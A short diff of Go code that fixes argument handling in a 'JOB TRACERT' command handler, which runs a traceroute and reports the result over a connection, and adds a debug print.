@@ -149,12 +149,15 @@ func Seeker() {
 			case "JOB TRACERT":
 				data2 := strings.Split(data, " ")
 				if len(data2) > 1 {
+					ips := jobs.Traceroute(data2[0], data2[1])
+					conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
 				} else {
 					if runtime.GOOS == "windows" {
-						ips := jobs.Traceroute("Wi-Fi", data2[1])
+						fmt.Println(data2)
+						ips := jobs.Traceroute("Wi-Fi", data2[0])
 						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
 					} else {
-						ips := jobs.Traceroute("eth0", data2[1])
+						ips := jobs.Traceroute("eth0", data2[0])
 						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
 					}
 				}
